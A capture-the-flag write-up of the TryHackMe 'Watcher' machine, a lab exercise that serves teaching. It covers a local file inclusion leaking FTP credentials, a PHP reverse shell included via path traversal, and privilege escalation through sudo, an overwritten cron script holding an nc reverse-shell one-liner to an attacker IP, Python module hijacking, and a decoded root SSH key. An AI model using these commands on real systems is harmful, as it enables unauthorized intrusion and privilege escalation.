# Watcher - TryHackMe

Linux machine running a PHP web application, FTP and SSH. The path runs through a local file
inclusion on `post.php` that exposes FTP credentials and the upload directory, a PHP shell
uploaded over FTP and included through the LFI, and a four-step privilege escalation chain:
sudo to `toby`, a writable cron script to `mat`, Python library hijacking to `will`, and a
base64-encoded SSH key in a backup folder to `root`.

Target: `10.65.147.26`, attacker machine: `10.65.77.54`

The room was completed over several sessions and the target IP changed on every restart.
The commands below all use the IP from the last session.

---

## Reconnaissance

```bash
nmap -sV -sC 10.65.147.26
```

| Service | Port | Notes |
|---|---|---|
| FTP (vsftpd 3.0.5) | 21 | Upload of the PHP shell |
| SSH (OpenSSH 8.2p1 Ubuntu) | 22 | Final access as root |
| HTTP (Apache 2.4.41) | 80 | Jekyll 4.1.1 site "Corkplacemats" |

---

## Enumeration

### Web Application

```bash
gobuster dir -u http://10.65.147.26 -w /usr/share/dirb/wordlists/common.txt
```

Among the results is `robots.txt`:

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

`/flag_1.txt` holds the first flag. `/secret_file_do_not_read.txt` answers with
`403 Forbidden`.

The pages on the site are loaded through URLs of the form `post.php?post=<file>`, with the
file name passed as a parameter.

### Local File Inclusion

Passing the secret file to the `post` parameter returns its content, because the file is
read by PHP on the server instead of being served directly by Apache:

```
http://10.65.147.26/post.php?post=secret_file_do_not_read.txt
```

```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to
/home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
```

The note gives the FTP credentials and the absolute path where uploaded files are stored.

### FTP

Logging in as `ftpuser` shows `flag_2.txt` in the FTP root and a writable `files`
directory, which maps to `/home/ftpuser/ftp/files` on the server.

---

## Exploitation

### From LFI to code execution

`post.php` includes the file it is given, so PHP code inside that file is executed. A
one-line PHP reverse shell pointing to `10.65.77.54` on port 4444 is saved as `shell.php`
on the attacker machine and uploaded over FTP into `files`:

```bash
ftp 10.65.147.26
# ftpuser / givemefiles777
cd files
put shell.php
bye
```

With a listener open:

```bash
nc -lvnp 4444
```

the shell is included through the LFI with a path traversal to the upload directory:

```bash
curl "http://10.65.147.26/post.php?post=../../../../home/ftpuser/ftp/files/shell.php"
```

The listener receives a shell as `www-data` in `/var/www/html`. The web root contains the
`more_secrets_a9f10a` directory, with the third flag in
`/var/www/html/more_secrets_a9f10a/flag_3.txt`.

The shell is stabilized before moving on:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on the attacker machine:
stty raw -echo; fg
# back on the target:
export TERM=xterm
```

---

## Privilege Escalation

### www-data to toby

```bash
sudo -l
```

```
(toby) NOPASSWD: ALL
```

`www-data` can run any command as `toby` without a password. `toby`'s home directory holds
`flag_4.txt`, readable only by `toby`, and a note from Mat:

```
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

The fourth flag is read through sudo:

```bash
sudo -u toby cat /home/toby/flag_4.txt
```

### toby to mat

`/home/toby/jobs/cow.sh` is the script run by Mat's cron job:

```bash
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

```
-rwxr-xr-x 1 toby toby 46 Dec  3  2020 cow.sh
```

The file is owned by `toby` and not writable by `www-data`, but it can be edited through
`sudo -u toby`. Its content is replaced with a reverse shell:

```bash
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.65.77.54 4445 >/tmp/f
```

With a listener on port 4445, the next run of the cron job gives a shell as `mat`. The fifth
flag is in `/home/mat/flag_5.txt`.

### mat to will

Mat's home directory holds another note:

```
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the
script with sudo so it should be safe.

Will
```

```bash
sudo -l
```

```
(will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

```
-rw-r--r-- 1 mat  mat   289 Nov 26 15:09 cmd.py
drwxrwxr-x 2 will will 4096 Nov 26 14:49 __pycache__
-rw-r--r-- 1 will will  208 Dec  3  2020 will_script.py
```

`will_script.py` belongs to `will` and cannot be modified, but it imports `cmd.py`, which
belongs to `mat`. Python runs the top-level code of a module as soon as it is imported, and
here the import happens inside a process running as `will`. Two lines added at the top of
`cmd.py`:

```python
import os
os.system("/bin/bash")
```

The script has to be called with the exact interpreter and script path from the sudo rule.
The `*` accepts any argument:

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
whoami
```

Shell as `will`, and the sixth flag in `/home/will/flag_6.txt`.

### will to root

`id` shows that `will` is a member of the `adm` group. Searching for files owned by that
group:

```bash
find / -group adm 2>/dev/null
```

returns `/opt/backups/key.b64`. The file holds a base64 string starting with
`LS0tLS1CRUdJTi`, which is `-----BEGIN` encoded. Decoding it gives an RSA private key:

```bash
base64 -d /opt/backups/key.b64 > /tmp/key
chmod 600 /tmp/key
ssh -i /tmp/key root@localhost
```

Shell as `root`, and the seventh flag in `/root/flag_7.txt`.

---

## Key Takeaways

- The secret file returned 403 from Apache but was readable through the LFI, and it held
  both the FTP credentials and the upload path needed to turn the inclusion into code
  execution.
- `cow.sh` was owned by `toby` but run by Mat's cron job, so the `(toby) NOPASSWD: ALL`
  rule was enough to get a shell as `mat`.
- The sudo rule for `will` protected the script, not the `cmd.py` module it imports from a
  directory owned by `mat`.
- The `adm` group membership of `will` led to `/opt/backups/key.b64`, a base64-encoded PEM
  block holding root's SSH key.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were
performed strictly for educational purposes.
